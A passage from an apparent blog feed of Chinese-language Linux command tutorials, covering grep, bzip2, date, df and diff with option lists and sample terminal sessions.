grep -f test2.txthnlinuxubuntu linuxRedhatlinuxmint[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出test.txt文件中含有从test2.txt文件中读取出的关键词的内容行 实例4：从文件中读取关键词进行搜索 且显示行号&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt | grep -nf test2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost test]# cat test.txt hnlinuxpeida.cnblogs.comubuntuubuntu linuxredhatRedhatlinuxmint[root@localhost test]# cat test2.txt linuxRedhat[root@localhost test]# cat test.txt | grep -nf test2.txt1:hnlinux4:ubuntu linux6:Redhat7:linuxmint[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出test.txt文件中含有从test2.txt文件中读取出的关键词的内容行，并显示每一行的行号 实例5：从文件中查找关键词&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1grep 'linux' test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost test]# grep 'linux' test.txt hnlinuxubuntu linuxlinuxmint[root@localhost test]# grep -n 'linux' test.txt 1:hnlinux4:ubuntu linux7:linuxmint[root@localhost test]# 实例6：从多个文件中查找关键词&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1grep 'linux' test.txt test2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011[root@localhost test]# grep -n 'linux' test.txt test2.txt test.txt:1:hnlinuxtest.txt:4:ubuntu linuxtest.txt:7:linuxminttest2.txt:1:linux[root@localhost test]# grep 'linux' test.txt test2.txt test.txt:hnlinuxtest.txt:ubuntu linuxtest.txt:linuxminttest2.txt:linux[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;多文件时，输出查询到的信息内容行时，会把文件的命名在行最前面输出并且加上”:”作为标示符 实例7：grep不显示本身进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ps aux|grep \[s]shps aux | grep ssh | grep -v "grep" &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011[root@localhost test]# ps aux|grep sshroot 2720 0.0 0.0 62656 1212 ? Ss Nov02 0:00 /usr/sbin/sshdroot 16834 0.0 0.0 88088 3288 ? Ss 19:53 0:00 sshd: root@pts/0 root 16901 0.0 0.0 61180 764 pts/0 S+ 20:31 0:00 grep ssh[root@localhost test]# ps aux|grep \[s]sh][root@localhost test]# ps aux|grep \[s]shroot 2720 0.0 0.0 62656 1212 ? Ss Nov02 0:00 /usr/sbin/sshdroot 16834 0.0 0.0 88088 3288 ? Ss 19:53 0:00 sshd: root@pts/0 [root@localhost test]# ps aux | grep ssh | grep -v "grep"root 2720 0.0 0.0 62656 1212 ? Ss Nov02 0:00 /usr/sbin/sshdroot 16834 0.0 0.0 88088 3288 ? Ss 19:53 0:00 sshd: root@pts/0 实例8：找出已u开头的行内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt |grep ^u &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# cat test.txt |grep ^uubuntuubuntu linux[root@localhost test]# 实例9：输出非u开头的行内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt |grep ^[^u] &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# cat test.txt |grep ^[^u]hnlinuxpeida.cnblogs.comredhatRedhatlinuxmint[root@localhost test]# 实例10：输出以hat结尾的行内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt |grep hat$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost test]# cat test.txt |grep hat$redhatRedhat[root@localhost test]# 实例11：&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# ifconfig eth0|grep "[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;" inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0[root@localhost test]# ifconfig eth0|grep -E "([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]" inet addr:192.168.120.204 Bcast:192.168.120.255 Mask:255.255.255.0[root@localhost test]# 实例12：显示包含ed或者at字符的内容行&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cat test.txt |grep -E "ed|at" &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# cat test.txt |grep -E "peida|com"peida.cnblogs.com[root@localhost test]# cat test.txt |grep -E "ed|at"redhatRedhat[root@localhost test]# 实例13：显示当前目录下面以.txt 结尾的文件中的所有包含每个字符串至少有7个连续小写字符的字符串的行&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1grep '[a-z]\&#123;7\&#125;' *.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test]# grep '[a-z]\&#123;7\&#125;' *.txttest.txt:hnlinuxtest.txt:peida.cnblogs.comtest.txt:linuxmint[root@localhost test]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- bz2]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F33.%20Linux%20%E5%91%BD%E4%BB%A4-bz2%2F</url>
    <content type="text"><![CDATA[Linux 命令- bz2&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bzip2 命令与 gzip 类似。bzip2 同样也不能压缩目录。 1.命令格式1bzip2 [参数] [文件] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bzip2采用新的压缩演算法，压缩效果比传统的LZ77/LZ78压缩演算法来得好。若没有加上任何参数，bzip2压缩完文件后会产生.bz2的压缩文件，并删除原始的文件。 3.命令参数 -c或–stdout 将压缩与解压缩的结果送到标准输出。 -d或–decompress 执行解压缩。 -f或–force bzip2在压缩或解压缩时，若输出文件与现有文件同名，预设不会覆盖现有文件。若要覆盖，请使用此参数。 -h或–help 显示帮助。 -k或–keep bzip2在压缩或解压缩后，会删除原始的文件。若要保留原始文件，请使用此参数。 -s或–small 降低程序执行时内存的使用量。 -t或–test 测试.bz2压缩文件的完整性。 -v或–verbose 压缩或解压缩文件时，显示详细的信息。 -z或–compress 强制执行压缩。 -L,–license, -V或–version 显示版本信息。 –repetitive-best 若文件中有重复出现的资料时，可利用此参数提高压缩效果。 –repetitive-fast 若文件中有重复出现的资料时，可利用此参数加快执行速度。 -压缩等级 压缩时的区块大小。 4.使用实例实例1：使用 bzip2 压缩一个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1bzip test.txt.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# cd test[root@localhost test]# bzip2 test.txt[root@localhost test]# lstest.txt.bz2[root@localhost test]# bzip2 -d test.txt.bz2[root@localhost test]# bzip2 -z test.txt[root@localhost test]# lstest.txt.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;压缩时，可以加 -z 参数，也可以不家加，都可以压缩文件，-d 则为解压的选项。 实例2：bzip2 解压一个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456[root@localhost test]# bzip2 -d test.txt.bz2[root@localhost test]# bzip2 test.tar[root@localhost test]# bzip2 -vd test.tar.bz2test.tar.bz2: done[root@localhost test]# lstest test.tar test.txt 实例3：通过 bzcat 命令可以直接读压缩文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1bzcat test.txt.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost test]# lstest test.tar.bz2 test.txt.bz2[root@localhost test]# bzcat test.txt.bz2testtest2test12]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- date]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F39.%20Linux%20%E5%91%BD%E4%BB%A4-%20date%2F</url>
    <content type="text"><![CDATA[Linux 命令- date&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux环境中，不管是编程还是其他维护，时间是必不可少的，也经常会用到时间的运算，熟练运用date命令来表示自己想要表示的时间，肯定可以给自己的工作带来诸多方便。 1．命令格式1date [参数]... [+格式] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;date 可以用来显示或设定系统的日期与时间。 3．命令参数：必要参数: %H 小时(以00-23来表示)。 %I 小时(以01-12来表示)。 %K 小时(以0-23来表示)。 %l 小时(以0-12来表示)。 %M 分钟(以00-59来表示)。 %P AM或PM。 %r 时间(含时分秒，小时以12小时AM/PM来表示)。 %s 总秒数。起算时间为1970-01-01 00:00:00 UTC。 %S 秒(以本地的惯用法来表示)。 %T 时间(含时分秒，小时以24小时制来表示)。 %X 时间(以本地的惯用法来表示)。 %Z 市区。 %a 星期的缩写。 %A 星期的完整名称。 %b 月份英文名的缩写。 %B 月份的完整英文名称。 %c 日期与时间。只输入date指令也会显示同样的结果。 %d 日期(以01-31来表示)。 %D 日期(含年月日)。 %j 该年中的第几天。 %m 月份(以01-12来表示)。 %U 该年中的周数。 %w 该周的天数，0代表周日，1代表周一，异词类推。 %x 日期(以本地的惯用法来表示)。 %y 年份(以00-99来表示)。 %Y 年份(以四位数来表示)。 %n 在显示时，插入新的一行。 %t 在显示时，插入tab。 MM 月份(必要) DD 日期(必要) hh 小时(必要) mm 分钟(必要) ss 秒(选择性) 选择参数: -d&lt;字符串&gt; 显示字符串所指的日期与时间。字符串前后必须加上双引号。 -s&lt;字符串&gt; 根据字符串来设置日期与时间。字符串前后必须加上双引号。 -u 显示GMT。 –help 在线帮助。 –version 显示版本信息 4．使用说明1.在显示方面，使用者可以设定欲显示的格式，格式设定为一个加号后接数个标记，其中可用的标记列表如下: % : 打印出 %： %n : 下一行 %t : 跳格 %H : 小时(00..23) %I : 小时(01..12) %k : 小时(0..23) %l : 小时(1..12) %M : 分钟(00..59) %p : 显示本地 AM 或 PM %r : 直接显示时间 (12 小时制，格式为 hh:mm:ss [AP]M) %s : 从 1970 年 1 月 1 日 00:00:00 UTC 到目前为止的秒数 %S : 秒(00..61) %T : 直接显示时间 (24 小时制) %X : 相当于 %H:%M:%S %Z : 显示时区 %a : 星期几 (Sun..Sat) %A : 星期几 (Sunday..Saturday) %b : 月份 (Jan..Dec) %B : 月份 (January..December) ;%c : 直接显示日期与时间 %d : 日 (01..31) %D : 直接显示日期 (mm/dd/yy) %h : 同 %b %j : 一年中的第几天 (001..366) %m : 月份 (01..12) %U : 一年中的第几周 (00..53) (以 Sunday 为一周的第一天的情形) %w : 一周中的第几天 (0..6) %W : 一年中的第几周 (00..53) (以 Monday 为一周的第一天的情形) %x : 直接显示日期 (mm/dd/yy) %y : 年份的最后两位数字 (00.99) %Y : 完整年份 (0000..9999) 2.在设定时间方面： date -s //设置当前时间，只有root权限才能设置，其他只能查看。 date -s 20080523 //设置成20080523，这样会把具体时间设置成空00:00:00 date -s 01:01:01 //设置具体时间，不会对日期做更改 date -s “01:01:01 2008-05-23″ //这样可以设置全部时间 date -s “01:01:01 20080523″ //这样可以设置全部时间 date -s “2008-05-23 01:01:01″ //这样可以设置全部时间 date -s “20080523 01:01:01″ //这样可以设置全部时间 3.加减： date +%Y%m%d //显示前天年月日 date +%Y%m%d –date=”+1 day” //显示前一天的日期 date +%Y%m%d –date=”-1 day” //显示后一天的日期 date +%Y%m%d –date=”-1 month” //显示上一月的日期 date +%Y%m%d –date=”+1 month” //显示下一月的日期 ;date +%Y%m%d –date=”-1 year” //显示前一年的日期 date +%Y%m%d –date=”+1 year” //显示下一年的日期 5．使用实例实例1：显示当前时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456datedate '+%c'date '+%D'date '+%x'date '+%T'date '+%X' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011[root@localhost ~]# date2012年 12月 08日 星期六 08:31:35 CST[root@localhost ~]# date '+%c'2012年12月08日 星期六 08时34分44秒[root@localhost ~]# date '+%D'12/08/12[root@localhost ~]# date '+%x'2012年12月08日[root@localhost ~]# date '+%T'08:35:36[root@localhost ~]# date '+%X'08时35分54秒[root@localhost ~]# 实例2：显示日期和设定时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1date --date 08:42:00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# date '+%c'2012年12月08日 星期六 08时41分37秒[root@localhost ~]# date --date 08:42:002012年 12月 08日 星期六 08:42:00 CST[root@localhost ~]# date '+%c' --date 08:45:002012年12月08日 星期六 08时45分00秒[root@localhost ~]# 实例3：date -d参数使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost ~]# date -d "nov 22"2012年 11月 22日 星期四 00:00:00 CST[root@localhost ~]# date -d '2 weeks'2012年 12月 22日 星期六 08:50:21 CST[root@localhost ~]# date -d 'next monday'2012年 12月 10日 星期一 00:00:00 CST[root@localhost ~]# date -d next-day +%Y%m%d20121209[root@localhost ~]# date -d tomorrow +%Y%m%d20121209[root@localhost ~]# date -d last-day +%Y%m%d20121207[root@localhost ~]# date -d yesterday +%Y%m%d20121207[root@localhost ~]# date -d last-month +%Y%m201211[root@localhost ~]# date -d next-month +%Y%m201301[root@localhost ~]# date -d '30 days ago' 2012年 11月 08日 星期四 08:51:37 CST[root@localhost ~]# date -d '-100 days' 2012年 08月 30日 星期四 08:52:03 CST[root@localhost ~]# date -d 'dec 14 -2 weeks'2012年 11月 30日 星期五 00:00:00 CST[root@localhost ~]# date -d '50 days'2013年 01月 27日 星期日 08:52:27 CST &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;date 命令的另一个扩展是 -d 选项，该选项非常有用。使用这个功能强大的选项，通过将日期作为引号括起来的参数提供，您可以快速地查明一个特定的日期。-d 选项还可以告诉您，相对于当前日期若干天的究竟是哪一天，从现在开始的若干天或若干星期以后，或者以前（过去）。通过将这个相对偏移使用引号括起来，作为 -d 选项的参数，就可以完成这项任务。 具体说明如下： date -d “nov 22” 今年的 11 月 22 日是星期三 date -d ‘2 weeks’ 2周后的日期 date -d ‘next monday’ (下周一的日期) date -d next-day +%Y%m%d（明天的日期）或者：date -d tomorrow +%Y%m%d date -d last-day +%Y%m%d(昨天的日期) 或者：date -d yesterday +%Y%m%d date -d last-month +%Y%m(上个月是几月) date -d next-month +%Y%m(下个月是几月) 使用 ago 指令，您可以得到过去的日期： date -d ‘30 days ago’ （30天前的日期） 使用负数以得到相反的日期： date -d ‘dec 14 -2 weeks’ （相对:dec 14这个日期的两周前的日期） date -d ‘-100 days’ (100天以前的日期) date -d ‘50 days’(50天后的日期) 实例4：显示月份和日数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1date '+%B %d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost ~]# date '+%B %d' 十二月 08[root@localhost ~]# 实例5：显示时间后跳行，再显示目前日期&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1date '+%T%n%D' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# date '+%T%n%D'09:00:3012/08/12[root@localhost ~]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- df]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F35.%20Linux%20%E5%91%BD%E4%BB%A4-%20df%2F</url>
    <content type="text"><![CDATA[Linux 命令- df&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux中df命令的功能是用来检查linux服务器的文件系统的磁盘空间占用情况。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;显示指定磁盘文件的可用空间。如果没有文件名被指定，则所有当前被挂载的文件系统的可用空间将被显示。默认情况下，磁盘空间将以 1KB 为单位进行显示，除非环境变量 POSIXL_CORRECT 被指定，那样将以512字节为单位进行显示。 3.命令参数必要参数 -a 全部文件系统列表 -h 方便阅读方式显示 -H 等于“-h”，但是计算式，1K=1000，而不是1K=1024 -i 显示inode信息 -k 区块为1024字节 -l 只显示本地文件系统 -m 区块为1048576字节 –no-sync 忽略 sync 命令 -P 输出格式为POSIX –sync 在取得磁盘信息前，先执行sync命令 -T 文件系统类型 选择参数： –block-size=&lt;区块大小&gt; 指定区块大小 -t&lt;文件系统类型&gt; 只显示选定文件系统的磁盘信息 -x&lt;文件系统类型&gt; 不显示选定文件系统的磁盘信息 –help 显示帮助信息 –version 显示版本信息 4.使用实例实例1：显示磁盘使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@CT1190 log]# df文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda7 19840892 890896 17925856 5% //dev/sda9 203727156 112797500 80413912 59% /opt/dev/sda8 4956284 570080 4130372 13% /var/dev/sda6 19840892 1977568 16839184 11% /usr/dev/sda3 988116 23880 913232 3% /boottmpfs 16473212 0 16473212 0% /dev/shm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 中 df 命令的输出清单的第1列是代表文件系统对应设备文件的路径名（一般是硬盘上的分区）；第2列给出分区包含的数据块（1024字节）的数目；第3、4列分别表示已用的和可用的数据块数目。用户也许会感到奇怪的是，第3、4列块数之和不等于第2列中的块数。这是因为缺省的每个分区都留了少量空间供系统管理员使用。即使遇到普通用户空间已满的情况，管理员仍能登录和留有解决问题所需的工作空间。清单 use% 列表普通用户空间使用的百分比，即使这一数字达到 100% ，分区仍然留有系统管理员使用的空间。最后，Mounted on 列表示文件系统的挂载点。 实例2：以 inode 模式来显示磁盘使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -i &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@CT1190 log]# df -i文件系统 Inode (I)已用 (I)可用 (I)已用% 挂载点/dev/sda7 5124480 5560 5118920 1% //dev/sda9 52592640 50519 52542121 1% /opt/dev/sda8 1280000 8799 1271201 1% /var/dev/sda6 5124480 80163 5044317 2% /usr/dev/sda3 255232 34 255198 1% /boottmpfs 4118303 1 4118302 1% /dev/shm 实例3：显示指定类型磁盘&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -t ext3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@CT1190 log]# df -t ext3文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda7 19840892 890896 17925856 5% //dev/sda9 203727156 93089700 100121712 49% /opt/dev/sda8 4956284 570104 4130348 13% /var/dev/sda6 19840892 1977568 16839184 11% /usr/dev/sda3 988116 23880 913232 3% /boot 实例4：列出各文件系统的 i 节点使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -ia &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@CT1190 log]# df -ia文件系统 Inode (I)已用 (I)可用 (I)已用% 挂载点/dev/sda7 5124480 5560 5118920 1% /proc 0 0 0 - /procsysfs 0 0 0 - /sysdevpts 0 0 0 - /dev/pts/dev/sda9 52592640 50519 52542121 1% /opt/dev/sda8 1280000 8799 1271201 1% /var/dev/sda6 5124480 80163 5044317 2% /usr/dev/sda3 255232 34 255198 1% /boottmpfs 4118303 1 4118302 1% /dev/shmnone 0 0 0 - /proc/sys/fs/binfmt_misc 实例5：列出文件系统的类型&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -T &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678root@CT1190 log]# df -T文件系统 类型 1K-块 已用 可用 已用% 挂载点/dev/sda7 ext3 19840892 890896 17925856 5% //dev/sda9 ext3 203727156 93175692 100035720 49% /opt/dev/sda8 ext3 4956284 570104 4130348 13% /var/dev/sda6 ext3 19840892 1977568 16839184 11% /usr/dev/sda3 ext3 988116 23880 913232 3% /boottmpfs tmpfs 16473212 0 16473212 0% /dev/shm 实例6：以更易读的方式显示目前磁盘空间和使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1df -h &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132[root@CT1190 log]# df -h文件系统 容量 已用 可用 已用% 挂载点/dev/sda7 19G 871M 18G 5% //dev/sda9 195G 89G 96G 49% /opt/dev/sda8 4.8G 557M 4.0G 13% /var/dev/sda6 19G 1.9G 17G 11% /usr/dev/sda3 965M 24M 892M 3% /boottmpfs 16G 0 16G 0% /dev/shm[root@CT1190 log]# df -H文件系统 容量 已用 可用 已用% 挂载点/dev/sda7 21G 913M 19G 5% //dev/sda9 209G 96G 103G 49% /opt/dev/sda8 5.1G 584M 4.3G 13% /var/dev/sda6 21G 2.1G 18G 11% /usr/dev/sda3 1.1G 25M 936M 3% /boottmpfs 17G 0 17G 0% /dev/shm[root@CT1190 log]# df -lh文件系统 容量 已用 可用 已用% 挂载点/dev/sda7 19G 871M 18G 5% //dev/sda9 195G 89G 96G 49% /opt/dev/sda8 4.8G 557M 4.0G 13% /var/dev/sda6 19G 1.9G 17G 11% /usr/dev/sda3 965M 24M 892M 3% /boottmpfs 16G 0 16G 0% /dev/shm[root@CT1190 log]# df -k文件系统 1K-块 已用 可用 已用% 挂载点/dev/sda7 19840892 890896 17925856 5% //dev/sda9 203727156 93292572 99918840 49% /opt/dev/sda8 4956284 570188 4130264 13% /var/dev/sda6 19840892 1977568 16839184 11% /usr/dev/sda3 988116 23880 913232 3% /boottmpfs 16473212 0 16473212 0% /dev/shm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-h更具目前磁盘空间和使用情况 以更易读的方式显示 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-H根上面的-h参数相同,不过在根式化的时候,采用1000而不是1024进行容量转换 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-k以单位显示磁盘的使用情况 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-l显示本地的分区的磁盘空间使用率,如果服务器nfs了远程服务器的磁盘,那么在df上加上-l后系统显示的是过滤nsf驱动器后的结果 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-i显示inode的使用情况。linux采用了类似指针的方式管理磁盘空间影射.这也是一个比较关键应用]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- diff]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F38.%20Linux%20%E5%91%BD%E4%BB%A4-%20diff%2F</url>
    <content type="text"><![CDATA[Linux 命令- diff&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;diff 命令是 linux上非常重要的工具，用于比较文件的内容，特别是比较两个版本不同的文件以找到改动的地方。diff在命令行中打印每一个行的改动。最新版本的diff还支持二进制文件。diff程序的输出被称为补丁 (patch)，因为Linux系统中还有一个patch程序，可以根据diff的输出将a.c的文件内容更新为b.c。diff是svn、cvs、git等版本控制工具不可或缺的一部分。 1．命令格式1diff [参数] [文件1或目录1] [文件2或目录2] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;diff命令能比较单个文件或者目录内容。如果指定比较的是文件，则只有当输入为文本文件时才有效。以逐行的方式，比较文本文件的异同处。如果指定比较的是目录的的时候，diff 命令会比较两个目录下名字相同的文本文件。列出不同的二进制文件、公共子目录和只在一个目录出现的文件。 3．命令参数： 指定要显示多少行的文本。此参数必须与-c或-u参数一并使用。 -a或–text diff预设只会逐行比较文本文件。 -b或–ignore-space-change 不检查空格字符的不同。 -B或–ignore-blank-lines 不检查空白行。 -c 显示全部内文，并标出不同之处。 -C或–context 与执行”-c-“指令相同。 -d或–minimal 使用不同的演算法，以较小的单位来做比较。 -D或ifdef 此参数的输出格式可用于前置处理器巨集。 -e或–ed 此参数的输出格式可用于ed的script文件。 -f或-forward-ed 输出的格式类似ed的script文件，但按照原来文件的顺序来显示不同处。 -H或–speed-large-files 比较大文件时，可加快速度。 -l或–ignore-matching-lines 若两个文件在某几行有所不同，而这几行同时都包含了选项中指定的字符或字符串，则不显示这两个文件的差异。 -i或–ignore-case 不检查大小写的不同。 -l或–paginate 将结果交由pr程序来分页。 -n或–rcs 将比较结果以RCS的格式来显示。 -N或–new-file 在比较目录时，若文件A仅出现在某个目录中，预设会显示：Only in目录：文件A若使用-N参数，则diff会将文件A与一个空白的文件比较。 -p 若比较的文件为C语言的程序码文件时，显示差异所在的函数名称。 -P或–unidirectional-new-file 与-N类似，但只有当第二个目录包含了一个第一个目录所没有的文件时，才会将这个文件与空白的文件做比较。 -q或–brief 仅显示有无差异，不显示详细的信息。 -r或–recursive 比较子目录中的文件。 -s或–report-identical-files 若没有发现任何差异，仍然显示信息。 -S或–starting-file 在比较目录时，从指定的文件开始比较。 -t或–expand-tabs 在输出时，将tab字符展开。 -T或–initial-tab 在每行前面加上tab字符以便对齐。 -u,-U或–unified= 以合并的方式来显示文件内容的不同。 -v或–version 显示版本信息。 -w或–ignore-all-space 忽略全部的空格字符。 -W或–width 在使用-y参数时，指定栏宽。 -x或–exclude 不比较选项中所指定的文件或目录。 -X或–exclude-from 您可以将文件或目录类型存成文本文件，然后在=中指定此文本文件。 -y或–side-by-side 以并列的方式显示文件的异同之处。 –help 显示帮助。 –left-column 在使用-y参数时，若两个文件某一行内容相同，则仅在左侧的栏位显示该行内容。 –suppress-common-lines 在使用-y参数时，仅显示不同之处。 4．使用实例：实例1：比较两个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff log2014.log log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112[root@localhost test3]# diff log2014.log log2013.log 3c3&lt; 2014-03---&gt; 2013-038c8&lt; 2013-07---&gt; 2013-0811,12d10&lt; 2013-11&lt; 2013-12 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的“3c3”和“8c8”表示log2014.log和log20143log文件在3行和第8行内容有所不同；”11,12d10”表示第一个文件比第二个文件多了第11和12行。 diff 的normal 显示格式有三种提示:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;a - add &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;c - change &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;d - delete 实例2：并排格式输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff log2013.log log2014.log -y -W 50 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526[root@localhost test3]# diff log2014.log log2013.log -y -W 502013-01 2013-012013-02 2013-022014-03 | 2013-032013-04 2013-042013-05 2013-052013-06 2013-062013-07 2013-072013-07 | 2013-082013-09 2013-092013-10 2013-102013-11 &lt;2013-12 &lt;[root@localhost test3]# diff log2013.log log2014.log -y -W 502013-01 2013-012013-02 2013-022013-03 | 2014-032013-04 2013-042013-05 2013-052013-06 2013-062013-07 2013-072013-08 | 2013-072013-09 2013-092013-10 2013-10 &gt; 2013-11 &gt; 2013-12 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“|”表示前后2个文件内容有不同 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“&lt;”表示后面文件比前面文件少了1行内容 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“&gt;”表示后面文件比前面文件多了1行内容 实例3：上下文输出格式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1diff log2013.log log2014.log -c &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455[root@localhost test3]# diff log2013.log log2014.log -c*** log2013.log 2012-12-07 16:36:26.000000000 +0800--- log2014.log 2012-12-07 18:01:54.000000000 +0800****************** 1,10 **** 2013-01 2013-02! 2013-03 2013-04 2013-05 2013-06 2013-07! 2013-08 2013-09 2013-10--- 1,12 ---- 2013-01 2013-02! 2014-03 2013-04 2013-05 2013-06 2013-07! 2013-07 2013-09 2013-10+ 2013-11+ 2013-12[root@localhost test3]# diff log2014.log log2013.log -c*** log2014.log 2012-12-07 18:01:54.000000000 +0800--- log2013.log 2012-12-07 16:36:26.000000000 +0800****************** 1,12 **** 2013-01 2013-02! 2014-03 2013-04 2013-05 2013-06 2013-07! 2013-07 2013-09 2013-10- 2013-11- 2013-12--- 1,10 ---- 2013-01 2013-02! 2013-03 2013-04 2013-05 2013-06 2013-07! 2013-08 2013-09 2013-10[root@localhost test3]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这种方式在开头两行作了比较文件的说明，这里有三中特殊字符： 